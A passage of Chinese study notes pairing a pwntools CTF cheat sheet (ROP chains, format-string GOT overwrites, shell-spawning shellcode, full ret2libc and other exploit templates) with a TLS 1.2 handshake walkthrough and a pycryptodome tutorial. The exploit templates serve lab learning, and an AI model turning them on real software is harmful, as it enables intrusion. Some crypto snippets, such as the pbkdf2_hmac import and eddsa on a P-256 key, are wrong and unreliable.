| `io.sendlineafter(text, data)` | 收到 text 后发送 data + 换行（自动等待提示符） |
| `io.sendafter(text, data)` | 收到 text 后发送 data（不加换行） |
| `io.recv(n)` | 接收 n 个字节 |
| `io.recvline()` | 接收一行（到 \n 为止） |
| `io.recvuntil(text)` | 接收直到遇到 text（阻塞等待） |
| `io.recvrepeat(timeout=2)` | 持续接收直到超时 |
| `io.recvall()` | 接收直到 EOF |
| `io.interactive()` | 进入手动交互模式（拿到 shell 后用） |
| `io.close()` | 关闭连接 |
| `io.shutdown('send')` / `io.shutdown('recv')` | 单独关闭发送端 / 接收端 |

## ELF 分析

| API | 说明 |
|---|---|
| `elf = ELF('./pwn1')` | 加载并自动分析 ELF |
| `elf.address` | 基址（未开 PIE 时即原始地址，开 PIE 后为偏移参考值） |
| `elf.symbols['system']` | 符号地址（如 system 函数） |
| `elf.symbols['main']` | main 函数地址 |
| `elf.got['puts']` | GOT 表中 puts 的地址（动态链接关键） |
| `elf.got['printf']` | GOT 表中 printf 的地址 |
| `elf.plt['puts']` | PLT 表中 puts 的地址 |
| `elf.bss()` | BSS 段地址（可写，常用来放 shellcode 或接收数据） |
| `elf.search(b'/bin/sh')` | 在二进制中搜索字节序列，返回生成器（需 list() 或 next() 取值） |
| `elf.strings` | 所有字符串的生成器 |

常用组合：

```python
binsh = next(elf.search(b'/bin/sh\x00'))   # /bin/sh 字符串地址
system_addr = elf.symbols['system']        # system 地址
got_puts = elf.got['puts']                 # puts 的 GOT 地址
plt_puts = elf.plt['puts']                 # puts 的 PLT 地址
bss_addr = elf.bss()                       # BSS 段可写地址
```

## 位数、进制与类型转换

`pack` / `unpack` 是最常用的字节序转换：默认小端序。

```python
p32(0xdeadbeef)                  # 32 位整数 -> 4 字节小端序 bytes
p64(0x7ffff7a5d000)              # 64 位整数 -> 8 字节小端序 bytes
u32(b'\xef\xbe\xad\xde')         # 4 字节小端序 bytes -> 32 位整数
u64(b'\x00\x00\x5d\xa5\xf7\xff\x7f\x00')  # 8 字节小端序 bytes -> 64 位整数
u32_ex(data) / u64_ex(data)      # 安全版本：异常时返回 None
```

进制转换与字符串 / 字节互转：

```python
hex(0xdeadbeef)                  # 整数 -> '0xdeadbeef'
int('deadbeef', 16)              # 十六进制字符串 -> 整数
ord('A')                         # 字符 -> ASCII 码 65
chr(65)                          # ASCII 码 -> 字符 'A'

b'Hello'                         # Python3 中 payload 默认用 bytes 表示
'Hello'.encode()                 # str -> bytes
b'Hello'.decode()                # bytes -> str
b'\x41\x42\x43'                  # 字节序列

enhex(b'Hello')                  # bytes -> '48656c6c6f'
unhex('48656c6c6f')              # '48656c6c6f' -> b'Hello'
```

地址计算与对齐（PIE 开启时，实际地址 = 泄漏基址 + 偏移）：

```python
base_addr = 0x555555554000       # 基址
offset = elf.symbols['main']     # 偏移
real_main = base_addr + offset   # 实际地址

addr_aligned = addr & ~0xf       # 向下 16 字节对齐
addr_aligned = addr & ~0x7       # 向下 8 字节对齐
```

## ROP 链构造

ROP（Return-Oriented Programming）通过在栈上布置一系列"返回地址"，让每个返回地址指向一段以 `ret` 结尾的 gadget（代码片段），串联起来实现任意逻辑（ret2libc / ret2csu / ret2plt 等）。

终端里用 ROPgadget 工具（独立安装：`pip3 install ROPgadget`），不是 pwntools 函数：

```bash
ROPgadget --binary ./pwn1 --only "pop|ret"     # 搜索所有 pop...ret
ROPgadget --binary ./pwn1 --only "int 0x80"    # 32 位系统调用入口
ROPgadget --binary ./pwn1 --only "syscall"     # 64 位系统调用入口
ROPgadget --binary ./pwn1 --string "/bin/sh"   # 搜索字符串
ROPgadget --binary ./pwn1 --ropchain           # 自动生成 ROP 链
ROPgadget --binary vuln | grep "pop rdi; ret"  # 64 位传参控制
ROPgadget --binary vuln | grep ": ret"         # 找 ret 指令（栈对齐）
ROPgadget --binary vuln | grep "leave; ret"    # 找栈迁移 gadget
ropper --file vuln --search "pop rdi"          # 另一款 ROP 工具（支持动态搜索）
```

pwntools 内置 ROP 对象：

```python
rop = ROP(elf)
rop.raw(0xdeadbeef)              # 放一个原始地址（不是 gadget，就是堆一个地址）
rop.call('system', [binsh])      # 调用 system("/bin/sh")
rop.call('puts', [got_puts])     # 调用 puts(puts_got) 泄漏地址
rop.ret()                        # 加 ret，用于 64 位栈对齐
rop.dump()                       # 打印 ROP 链的所有地址（调试用）
rop.chain()                      # 最终打包成 bytes payload
```

手动构造 64 位 ret2libc（最基础的方式）：

```python
payload = b'A' * offset          # padding
payload += p64(ret_gadget)       # ret 对齐
payload += p64(pop_rdi_ret)      # pop rdi; ret
payload += p64(binsh_addr)       # rdi = "/bin/sh"
payload += p64(system_addr)      # system() 的地址
```

64 位栈对齐的坑：64 位下调用 system 等函数时栈顶必须 16 字节对齐，所以要在真正的 ROP 链前先放一个 `ret` gadget（ret 指令相当于栈 +8 对齐）。

## 格式化字符串漏洞利用

核心原理：`printf("%s%s%s...", ...)` 会从栈上按顺序读取参数。如果用户能控制格式化字符串，就能读取栈上的数据（泄漏地址），甚至写入任意地址（改 GOT 表）。

触发条件：用户输入直接传给 `printf/fprintf/sprintf` 等函数，且没有限制格式符。

泄漏栈上数据（读）：

```python
payload = b'%p' * 10        # 泄漏前 10 个栈参数（十六进制）
payload = b'%x.' * 10       # 泄漏前 10 个栈参数（十六进制无 0x 前缀）
payload = b'%7$p'           # 精确泄漏第 7 个参数（从第 1 个开始计数）
payload = b'%7$s'           # 把第 7 个参数当字符串指针打印（泄漏 libc 地址）
```

自动化偏移计算：方法一是用 `cyclic(200)` 生成模式串，发送后观察输出中出现的值，再用 `cyclic_find(value)` 计算偏移；方法二是发 `AAAA%p.%p...` 观察 "AAAA"（0x41414141）出现在第几个参数位。

pwntools 的 `fmtstr_payload` 自动构造写 payload：

```python
from pwnlib.fmtstr import fmtstr_payload
# offset = 输入在栈上是第几个参数位置
# 把 printf 的 GOT 表项改为 system 的地址，下次调用 printf 实际执行 system
payload = fmtstr_payload(offset, {printf_got: system_addr})
```

手动构造写 payload（理解原理）：目标地址放最前面，用 `%n`（写入已打印字符数）/ `%hn`（写 2 字节）/ `%hhn`（写 1 字节），再用 `%c * N` 凑够要写入的数值。32 位示例：`payload = p32(target_addr) + p32(target_addr+2)` 之后分别用 `%{}c%{}$hn` 写低 2 字节与高 2 字节。

## Shellcode

```python
sc32 = asm(shellcraft.i386.sh())     # 32 位 execve("/bin/sh") shellcode
sc64 = asm(shellcraft.amd64.sh())    # 64 位 execve("/bin/sh") shellcode
sc = asm('mov eax, 0xb; int 0x80')   # 自定义 32 位汇编
```

shellcraft 内置 shellcode：

```python
shellcraft.sh()              # 通用 /bin/sh shell
shellcraft.amd64.sh()        # 64 位 /bin/sh
shellcraft.i386.sh()         # 32 位 /bin/sh
shellcraft.arm.sh()          # ARM /bin/sh
shellcraft.nop()             # NOP 指令
shellcraft.cat('/flag')      # 直接 cat 指定文件并输出
```

检查 shellcode 是否含坏字符：

```python
payload = asm(shellcraft.amd64.sh())
badchars = b'\x00\x0a\x0d\x20'     # 常见坏字符：空字节、换行、回车、空格
for i, b in enumerate(payload):
    if b in badchars:
        print(f"bad char {hex(b)} at offset {i}")
```

注意：shellcode 中不能包含 `\x00`（字符串截断）、`\x0a`（sendline 的 \n 截断）、`\x0d`（回车）。如果含坏字符，需要用编码工具或手写 shellcode 避开。

## 常用内置函数与工具

```python
cyclic(200)                  # 生成 200 字节唯一模式串（找溢出偏移用）
cyclic_find(0x61616166)      # 根据泄漏值找到偏移量
sleep(1)                     # 等待 1 秒
disasm(b'\xb8\x01\x00\x00\x00')   # 反汇编字节码 -> "mov eax, 1"
```

pwntools 自带参数解析，方便同一脚本切换本地 / 远程：

```python
from pwn import *
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--remote', action='store_true')
args = parser.parse_args()

if args.remote:
    io = remote('ip', port)
else:
    io = process('./pwn1')
```

## 基础 EXP 模板

**模板 1：32 位栈溢出 ret2text**

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')
elf = ELF('./pwn1')

win_addr = elf.symbols['win']      # 找到 win/backdoor 函数地址，或 0x0804856b
offset = 44                        # 用 cyclic 实测出的溢出偏移

payload = cyclic(offset)           # padding 填满缓冲区
payload += p32(win_addr)           # 覆盖返回地址为 win 函数

io = process('./pwn1')
io.sendlineafter(b'input:', payload)
io.interactive()
```

**模板 2：64 位 ret2libc（泄漏 libc 基址 + system("/bin/sh")）**

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./pwn1')

pop_rdi = 0x401203    # pop rdi; ret 的地址（ROPgadget 找）
ret = 0x40101a        # 一个 ret 指令的地址（栈对齐用）
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
main_addr = elf.symbols['main']
io = process('./pwn1')

# ---- 第一阶段：泄漏 puts 真实地址 ----
payload1 = b'A' * offset
payload1 += p64(ret)          # 栈对齐
payload1 += p64(pop_rdi)      # pop rdi; ret
payload1 += p64(got_puts)     # rdi = puts 的 GOT 地址
payload1 += p64(plt_puts)     # 调用 puts 打印真实地址
payload1 += p64(main_addr)    # 返回 main 重新执行
io.sendlineafter(b'input:', payload1)
io.recvuntil(b'something\n')  # 吃掉干扰输出

puts_leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info(f"puts leak: {hex(puts_leak)}")

# ---- 第二阶段：计算 system 和 /bin/sh 地址 ----
libc = ELF('./libc.so.6')
libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
log.info(f"libc base: {hex(libc_base)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh)}")

# ---- 第三阶段：构造 ROP 链执行 system("/bin/sh") ----
payload2 = b'A' * offset
payload2 += p64(ret)          # 栈对齐
payload2 += p64(pop_rdi)      # pop rdi; ret
payload2 += p64(binsh)        # rdi = "/bin/sh"
payload2 += p64(system_addr)  # system("/bin/sh")
io.sendlineafter(b'input:', payload2)
io.interactive()              # 拿到 shell
```

**模板 3：格式化字符串漏洞（自动写 GOT 表）**

```python
from pwn import *
from pwnlib.fmtstr import fmtstr_payload
context(os='linux', arch='i386', log_level='debug')
elf = ELF('./pwn1')
io = process('./pwn1')

# 确定偏移：发 AAAA%p.%p.%p... 观察 AAAA 出现在第几个位置，假设为第 6 个参数位
offset = 6
printf_got = elf.got['printf']
system_plt = elf.plt['system']
payload = fmtstr_payload(offset, {printf_got: system_plt})

io.sendlineafter(b'input:', payload)
io.interactive()
```

**模板 4：ret2shellcode**

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')

shellcode = asm(shellcraft.i386.sh())
io = process('./pwn1')
io.recvuntil(b'buf addr: ')
buf_addr = int(io.recvline().strip(), 16)   # 程序泄露的缓冲区地址
log.info(f"buf addr: {hex(buf_addr)}")

payload = shellcode
payload += b'A' * (offset - len(shellcode))  # 填满到返回地址
payload += p32(buf_addr)                     # 覆盖返回地址跳回 buf 执行 shellcode

io.sendlineafter(b'input:', payload)
io.interactive()
```

## 常见问题与排错（FAQ）

| 问题 | 原因与解决 |
|---|---|
| ModuleNotFoundError: No module named 'pwn' | 未安装：`pip install pwntools` |
| 连接超时 | `io = remote()` 连不上：检查 IP/端口/VPN，靶机是否在运行 |
| recvuntil 卡死 | 没收到预期的字符串：先开 debug 模式看实际收到了什么 |
| sendline 后无反应 | 程序在等特定格式输入：检查是否需要 `send` 而不是 `sendline`（不要多发 \n） |
| p32/p64 写入后程序崩溃 | 地址错了或栈没对齐：检查字节序（默认小端）、64 位是否加了 ret 对齐 |
| libc 地址末尾是 \x00 | u64 解析失败：用 `u64(io.recv(6).ljust(8, b'\x00'))` 补齐 |
| PIE 开启动态基址 | 每次运行地址不同：先泄漏一个已知地址（如 puts），算出基址再算偏移 |
| shellcode 含 \x00 被截断 | 输入函数遇到空字节截断：用 shellcraft 工具避免 \x00，或手动编码 |
| 本地能打通远程打不通 | libc 版本不一致或环境差异：`ldd ./pwn1` 确认本地与远程用同一个 libc.so.6 |
| cyclic_find 找不到 | 模式字符串被截断或坏字符干扰：减小 cyclic 长度再试，或手动用 GDB 确认偏移 |
| F5 反编译看到伪代码 | 不是 pwntools 的问题：F5 是 IDA Hex-Rays 把汇编还原出的类 C 伪代码，便于阅读逻辑但和逐条指令并非一一对应；要确认精确指令应回到汇编窗口或改用 GDB 调试 |

# 传输层安全：TLS

## 要解决的问题

TLSv1.2（传输层安全协议版本 1.2）是用于在计算机网络上提供安全通信的加密协议，核心是解决三件事：机密性（数据加密、防窃听）、完整性（消息认证、防篡改）与身份验证（证书认证、防冒充），广泛应用于 HTTPS、电子邮件和 VPN 等场景。整体思路是：先通过握手协议协商加密参数、验证身份并生成会话密钥，之后用对称加密保护应用数据。

## 密码套件（Cipher Suite）

每个密码套件定义了一组"密钥交换 + 认证 + 对称加密 + 消息认证（MAC）"的完整组合。握手中客户端列出支持的套件，服务端从中选择。

| 组件 | 作用 | 常见算法 |
|---|---|---|
| 密钥交换算法 | 安全地协商 / 交换密钥材料 | RSA、DH、ECDH |
| 认证算法 | 验证通信对端身份 | RSA、DSA |
| 对称加密算法 | 加密应用数据（效率高） | AES、3DES、RC4 |
| 消息认证码（MAC）算法 | 确保数据完整性 | HMAC-SHA256 等 |

本文示例套件 `TLS_RSA_WITH_AES_128_CBC_SHA`（0x002f）的含义：

- 密钥交换：RSA（用服务器证书中的 RSA 公钥加密 Pre-Master Secret）；
- 认证：RSA（证书验证服务器身份）；
- 对称加密：AES_128_CBC（128 位 AES、CBC 模式）；
- 消息认证（MAC）：SHA-1。

## 加密原理与密钥生成

TLS 不用非对称加密直接传输数据（太慢），而是让非对称加密只保护"种子"，再从中派生高速对称密钥：

1. 客户端与服务端分别在握手中明文交换各自的随机数；
2. 客户端生成 48 字节的 **Pre-Master Secret（预主密钥）**，用服务器的 RSA 公钥加密后发出——只有持有对应私钥的服务器才能解密；
3. 双方用 **PRF（伪随机函数）**，基于 Pre-Master Secret + 两端随机数，计算出相同的 **Master Secret（主密钥）**，保证每次握手密钥唯一；
4. Master Secret 再派生出实际使用的加密密钥、MAC 密钥与初始化向量（IV）。

消息认证：发送方在加密前为数据计算 MAC 值并一同发送，接收方解密后验证 MAC，从而检测数据是否被篡改。通过握手协商、密钥派生、对称加密与 MAC 的组合，TLSv1.2 实现机密性、完整性与身份验证。

## 握手过程逐包详解

以下以抓包视角逐条解析一次 TLS 1.2（RSA 密钥交换）的握手。

### 第 1 个报文：Client Hello（客户端 → 服务端）

1. 标明使用的 TLS 版本，这里即 1.2。
2. 给出一个客户端随机数（由时间戳和随机数构成），与后续的服务端随机数一起用于生成密钥。
3. 给出可用密码套件列表（cipher suites），每个套件定义了"密钥交换 + 认证 + 对称加密 + 消息认证（MAC）"的完整组合。
4. 会话 ID。

### 第 2 个报文：Server Hello（服务端 → 客户端）

1. 确认 TLS 版本：服务器从客户端支持的版本中选择，这里确认为 TLS 1.2（`0x0303`）。
2. 给出服务端随机数：服务器生成的 32 字节随机数，与客户端随机数一起用于生成 Master Secret，保证每次握手密钥唯一。
3. 确认密码套件：从客户端提供的套件中选一个自己支持且优先级最高的，示例选中 `TLS_RSA_WITH_AES_128_CBC_SHA`。
4. 会话 ID：此处为 0 表示这是一个全新连接、不进行会话恢复；若不为 0 则可用于快速恢复之前的会话。

随后服务器还会下发自己的数字证书（Certificate），供客户端验证服务器身份。

### 第 3 个报文：客户端一口气发三个协议

**① Client Key Exchange（Handshake Protocol）**

客户端生成 48 字节的 Pre-Master Secret，并用服务器证书中的 RSA 公钥加密后发送。其构成：前 2 字节为 TLS 版本号（`0x0303`，即 TLS 1.2），后 46 字节为随机数。只有拥有对应私钥的服务器才能解密。Pre-Master Secret 是生成 Master Secret 的关键材料，双方随后用相同算法计算 Master Secret，再派生出加密密钥、MAC 密钥与 IV。

**② Change Cipher Spec（独立协议）**

- 消息类型为 Change Cipher Spec（20），不是 Handshake 类型，是独立的记录层协议；
- 长度仅 1 个字节，值为 1；
- 含义：告诉服务器"接下来我发送的消息将会使用刚刚协商好的加密算法和密钥进行加密"，是切换加密模式的通知；
- 时机：在 Client Key Exchange 之后、Encrypted Handshake Message 之前发送。

**③ Encrypted Handshake Message（Handshake Protocol）**

- Handshake Type 为 Finished（20），但因为已被加密，抓包中显示为 Encrypted Handshake Message；
- 长度 64 字节；
- 加密前的内容：Finished 消息含一个 `verify_data`，是对整个握手过程所有消息的哈希值（用 PRF 计算）；
- 作用：这是第一条被加密传输的握手消息，用于验证双方派生的密钥一致、握手过程没有被篡改、对方确实拥有正确私钥（能解密 Pre-Master Secret）。

客户端发送加密的 Finished 后，等待服务端解密验证。

### 第 4 个报文：服务端也发三个协议

**① New Session Ticket（Handshake Protocol，可选）**

- Handshake Type 为 New Session Ticket（4），是可选的握手消息；
- 作用：服务器向客户端颁发会话票证（Session Ticket），用于后续连接的会话恢复（Session Resumption），避免再次执行完整 TLS 握手；
- 工作原理：服务器将会话状态加密后存入票证、发给客户端保存（不占用服务器存储资源）；下次连接时客户端直接提供票证，服务器解密验证后即可跳过完整密钥交换；
- 优势：减少一次完整的 RSA / ECDHE 计算开销，加快建连，尤其适合短连接频繁的场景（如 HTTP/2、HTTP/3）。

**② Change Cipher Spec（独立协议）**

- 与客户端之前发送的是同一类型（20），长度 1 字节、值为 1；
- 含义：告诉客户端"接下来我发送的消息将会使用加密"，是服务端切换加密模式的通知；
- 时机：在 New Session Ticket 之后、Encrypted Handshake Message 之前。

**③ Encrypted Handshake Message（Handshake Protocol）**

- 服务端的 Finished（20），同样 64 字节、加密传输，内含对整个握手过程所有消息的哈希 `verify_data`；
- 作用与客户端的 Finished 相同：验证服务端派生出的密钥是否正确，确认服务端能成功解密客户端之前发送的 Finished。

验证流程回顾：

```
客户端发送加密 Finished → 服务端解密验证
服务端发送加密 Finished → 客户端解密验证
双方验证通过 → 握手完成，后续应用数据全部加密传输
```

### 第 5 阶段：Application Data（应用数据）

握手完成后，应用数据通过 TLS 记录层传输：

- Content Type 为 Application Data（23），不同于之前的 Handshake（22）或 Change Cipher Spec（20）；
- 这是第一条被加密传输的应用数据，使用之前协商的密钥与算法（示例为 AES_128_CBC）保护，密钥由 Master Secret 派生；
- 抓包中看到的是密文，如 `Encrypted Application Data: d386f198bebe8a7ecf4140cb68bbed10...`，密文长度（如 64 字节）包含了填充，无法从抓包直接读取明文。

# Python 加解密：pycryptodome

## 基本概念与安装

PyCryptodome 是 Python 最强大的第三方加密解密库，是原 PyCrypto 库（已停止维护）的活跃维护分支。

| 要点 | 说明 |
|---|---|
| 安装 | `pip install pycryptodome`，注意不是 `pycrypto`（已废弃）也不是 `crypto` |
| 导入 | `from Crypto.Cipher import AES`，注意是大写的 `Crypto` |
| 大小写坑 | 系统自带的小写 `crypto` 是兼容层 / 空包，功能不全，必须用 `from Crypto` 导入 |
| 三大核心模块 | `Cipher`（对称加密）、`PublicKey`（非对称）、`Hash`/`Protocol`（哈希/协议） |
| 核心能力 | AES/DES/ChaCha20 对称加密、RSA/DSA/ECC 非对称、MD5/SHA 哈希、HMAC、PKCS 填充、随机数生成 |
| 适用场景 | 网络通信加密、文件加密存储、密码学实验、CTF、数据安全传输、数字签名 |

验证安装：

```bash
pip install pycryptodome
python -c "from Crypto.Cipher import AES; print('OK')"
python -c "import Crypto; print(Crypto.__version__)"
```

Jupyter 中可直接 `!pip install pycryptodome`。

## 对称加密算法概览

| 算法 | 密钥长度 | 块大小 | 模式 | 安全等级 | 说明 |
|---|---|---|---|---|---|
| AES | 128/192/256 位 | 16 字节 | CBC/CTR/GCM 等 | 极高 | 当前最推荐的对称加密标准 |
| DES | 56 位 | 8 字节 | 多种 | 低（已过时） | 密钥太短，不应再用于生产 |
| DES3 (3DES) | 112/168 位 | 8 字节 | 多种 | 中 | 兼容老系统，性能较差 |
| ChaCha20 | 256 位 | 流密码 | 无块 | 极高 | Google 推荐的替代 AES 方案 |
| Blowfish | 32-448 位 | 8 字节 | 多种 | 中 | 已被 AES 取代 |
| Salsa20 | 256 位 | 流密码 | 无块 | 高 | ChaCha20 的前身 |

选型建议：推荐 AES-256-GCM（自带认证加密）或 AES-256-CBC + HMAC。

## 填充方式（Padding）

块密码（如 ECB/CBC）要求明文长度是块大小的整数倍，否则需要填充；CTR/CFB/OFB/GCM 等本质是流密码模式，不需要填充，数据长度可任意。

| 填充方案 | 说明 |
|---|---|
| PKCS7 | 最常用。填充值 = 缺少的字节数（缺 3 字节则填充 0x03 0x03 0x03） |
| PKCS5 | 与 PKCS7 实质相同（PKCS5 限定块大小 8 字节） |
| ZeroPadding | 用 0x00 填充到最后一个块，不够安全，不建议 |
| ANSI X.923 | 最后一个字节为填充长度，其余填充 0x00 |
| ISO 10126 | 随机填充 + 最后一个字节为填充长度 |
| 何时不需要填充 | CTR / CFB / OFB / GCM 等流式模式 |

## AES-ECB（不安全，仅演示）

原理：每个 16 字节块独立加密，相同明文块产生相同密文块，有明显模式特征，可被模式分析攻击。ECB 不安全，不要在生产环境使用，仅用于教学演示或加密单个块（如加密 AES 密钥本身）。

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

key = b'my16bytekey12345'          # 16 字节 = AES-128
cipher = AES.new(key, AES.MODE_ECB)
ct = cipher.encrypt(pad(b'Hello World!!', 16))

cipher = AES.new(key, AES.MODE_ECB)
pt = unpad(cipher.decrypt(ct), 16)
```

## AES-CBC（最常用）

原理：每个明文块先与前一个密文块异或（XOR）再加密，第一个块与 IV 异或。IV 为 16 字节随机值，每次加密必须不同（不需保密，可随密文一起传输）。需要 PKCS7 填充。CBC 加密不能并行（必须等前一块加密完），解密可以并行。

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)                      # AES-256，32 字节密钥
iv = get_random_bytes(16)                       # 16 字节 IV
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(b'Hello World!! This is a secret message.', AES.block_size))

# 解密
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct), AES.block_size)
```

传输格式：通常把 IV 拼在密文前面一起传（`iv + ciphertext`），接收方先取前 16 字节作为 IV，剩余为密文。

## AES-CTR（推荐，不需要填充）

原理：把块密码转成流密码，用计数器（Counter）生成密钥流与明文 XOR。Nonce（通常 8-16 字节随机值）必须唯一，同一 Key + Nonce 组合绝不能重复使用。加解密都可并行处理，性能最好。

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
nonce = get_random_bytes(8)                     # 8 字节 Nonce
cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
ct = cipher.encrypt(b'Any length message, no padding needed!')

# 解密
cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
pt = cipher.decrypt(ct)
```

自定义计数器：`from Crypto.Util.Counter import new as new_counter`；`ctr = new_counter(128, initial_value=int.from_bytes(nonce + b'\x00'*8, 'big'), prefix=nonce)`。

安全性要求：同一个 Key 下 Nonce 绝对不能重复使用，否则安全性完全崩溃。最佳实践是用随机 Nonce（8 字节）或递增计数器。

## AES-GCM（最推荐）

原理：Galois/Counter Mode，即 CTR 模式 + GMAC 认证，同时提供加密和完整性校验。Nonce 推荐 12 字节且不可重复使用；无需填充；自动生成 16 字节认证标签（Tag）。加密 + 认证一体化（AEAD）是最安全的方案，防篡改 + 防伪造。

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
nonce = get_random_bytes(12)                    # GCM 推荐 12 字节 Nonce
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ct, tag = cipher.encrypt_and_digest(b'Any length message')

# 解密 + 验证
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
try:
    pt = cipher.decrypt_and_verify(ct, tag)
    print("验证成功，明文:", pt)
except ValueError:
    print("验证失败！密文或 Tag 被篡改！")
```

传输格式：`nonce(12) + tag(16) + ciphertext`，接收方先提取 nonce 和 tag 再解密验证。

## 密钥派生与安全随机数

| 函数 | 说明 | 示例 |
|---|---|---|
| `get_random_bytes(n)` | 生成 n 字节密码学安全随机数（来自 OS 的 CSPRNG） | `key = get_random_bytes(32)` |
| PBKDF2 | 从密码派生密钥（Password-Based Key Derivation Function 2） | `pbkdf2_hmac('sha256', b'password', b'salt', 100000, dklen=32)` |
| scrypt | 比 PBKDF2 更安全的 KDF（抗 GPU/ASIC 攻击） | `scrypt(b'password', b'salt', 32, N=2**14)` |
| HKDF | HMAC 的 Extract-and-Expand KDF（RFC 5869） | `HKDF(b'master_key', 32, b'', SHA256)` |

```python
from Crypto.Protocol.KDF import pbkdf2_hmac, scrypt, HKDF
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
key = pbkdf2_hmac('sha256', b'password', b'salt', 100000, dklen=32)
key = scrypt(b'password', b'salt', 32, N=2**14)
key = HKDF(b'master_key', 32, b'', SHA256)
```

⚠️ 绝对不要用 Python 自带的 `random` 模块生成密钥，它不是密码学安全的、结果可预测；必须用 `get_random_bytes()`（或 `Random.new().read(n)`）。

## 哈希算法（Hash）

| 算法 | 说明 |
|---|---|
| MD5 | 128 位，已不安全（碰撞已发现），仅用于文件完整性校验等非安全场景 |
| SHA1 | 160 位，已不安全（碰撞已发现） |
| SHA256 | 256 位，当前最推荐的哈希算法 |
| SHA512 | 512 位，安全性更高但稍慢 |
| SHA3_256 | 256 位，SHA-3 家族（Keccak 算法） |
| BLAKE2b | 输出长度可配置，速度比 SHA 更快 |

```python
from Crypto.Hash import MD5, SHA256, SHA512, SHA1, SHA3_256, BLAKE2b

h = SHA256.new(data)
digest = h.digest()          # 返回 bytes（32 字节）
h.hexdigest()                # 返回十六进制字符串（64 个字符）

# 增量更新（分块计算，适合大文件）
h = SHA256.new()
h.update(b'part1')
h.update(b'part2')

# 分块读取计算文件哈希，避免大文件占满内存
h = SHA256.new()
with open('bigfile.bin', 'rb') as f:
    for chunk in iter(lambda: f.read(8192), b''):
        h.update(chunk)
```

## HMAC（消息认证码）

基于哈希函数的消息认证码，用于验证消息完整性和真实性（需要共享密钥）。使用场景：API 签名、JWT 签名、Cookie 签名、消息防篡改。

```python
from Crypto.Hash import HMAC, SHA256

key = b'shared-key'
msg = b'message'

h = HMAC.new(key, digestmod=SHA256)   # key 是共享密钥（bytes）
h.update(msg)                          # 可多次 update
mac = h.digest()                       # bytes；h.hexdigest() 取 hex 字符串

# 验证：比较两个 HMAC 值（应使用 hmac.compare_digest 防时序攻击）
expected = HMAC.new(key, msg, digestmod=SHA256).hexdigest()
```

## RSA 非对称加密

概念：公钥加密、私钥解密（保护机密）；或私钥签名、公钥验证（确认来源）。

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

key = RSA.generate(2048)                 # 2048 位为最低安全要求，推荐 4096 位
private_key = key.export_key()           # PEM 格式，需妥善保管
public_key = key.publickey().export_key()  # PEM 格式，可以公开

# 从 PEM 导入
key = RSA.import_key(pem_data)

# 公钥加密
pub = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(pub)
ct = cipher.encrypt(message)

# 私钥解密
priv = RSA.import_key(private_key)
cipher = PKCS1_OAEP.new(priv)
pt = cipher.decrypt(ct)
```

要点：

- RSA 加密有明文长度限制，明文不能超过"密钥字节数 - 填充长度"（2048 位密钥最多加密约 190 字节）；大文件需用 RSA + AES 混合加密。
- 填充推荐 PKCS1_OAEP（最优非对称填充方案，带哈希和随机填充）；PKCS1_v1_5 存在 Bleichenbacher 攻击风险，不推荐新系统使用。

## RSA 数字签名

签名用私钥（证明消息确实来自持有私钥的人），公钥验证（任何人都可验证）。使用场景：软件发布签名、SSL 证书、JWT、数字合同、代码签名。

```python
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Signature import pkcs1_15, pss

key = RSA.generate(2048)
message = b'message to sign'

# PKCS1_v1_5 签名 / 验证
h = SHA256.new(message)
signature = pkcs1_15.new(key).sign(h)
pkcs1_15.new(key.publickey()).verify(h, signature)

# PSS 签名 / 验证（更安全，推荐）
h = SHA256.new(message)
sig = pss.new(key).sign(h)
pss.new(key.publickey()).verify(h, sig)     # 验证失败会抛出 ValueError
```

签名 vs 加密：签名 = 私钥签名 + 公钥验证（确认来源）；加密 = 公钥加密 + 私钥解密（保护机密），这是两个不同的安全功能。

## DSA 与 ECC（其他非对称算法）

| 算法 | 说明 | 导入 |
|---|---|---|
| DSA | Digital Signature Algorithm，仅用于签名（不能加密） | `from Crypto.PublicKey import DSA`、`from Crypto.Signature import DSS` |
| ECC | 椭圆曲线加密，密钥更短、性能更好（256 位 ECC ≈ 3072 位 RSA） | `from Crypto.PublicKey import ECC` |

```python
from Crypto.PublicKey import ECC
from Crypto.Signature import eddsa

key = ECC.generate(curve='secp256r1')      # 常用曲线：P-256/P-384/P-521、ed25519
sig = eddsa.new(key).sign(data)            # 签名
eddsa.new(key.public_key()).verify(data, sig)   # 验证
```

选型建议：签名优先 ECC（性能好、密钥短），加密用 RSA（通用性强），新系统优先 ECC。

## RSA + AES 混合加密（加密大文件 / 长消息）

RSA 不能加密大数据，于是用 RSA 加密 AES 密钥、用 AES 加密数据：

流程：生成随机 AES 密钥和 Nonce → 用 AES-GCM 加密数据 → 用 RSA 公钥加密 AES 密钥 → 传输 `RSA 加密后的 AES 密钥 + nonce + tag + 密文`。

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes

key_rsa = RSA.generate(2048)
pub_key = key_rsa.publickey()

# 生成随机 AES 密钥
aes_key = get_random_bytes(32)
nonce = get_random_bytes(12)

# AES-GCM 加密数据
